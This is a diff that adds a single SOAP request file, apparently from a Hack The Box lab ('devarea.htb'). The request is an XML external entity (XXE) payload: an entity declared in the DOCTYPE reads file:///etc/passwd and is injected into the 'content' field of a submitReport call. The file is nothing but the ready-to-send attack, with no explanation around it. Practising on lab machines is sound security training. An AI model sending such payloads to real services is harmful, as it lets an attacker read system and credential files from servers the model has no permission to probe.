@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE soapenv:Envelope [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <dev:submitReport>
+         <arg0>
+            <confidential>false</confidential>
+            <content>&xxe;</content>
+            <department>IT</department>
+            <employeeName>TestUser</employeeName>
+         </arg0>
+      </dev:submitReport>
+   </soapenv:Body>
+</soapenv:Envelope>
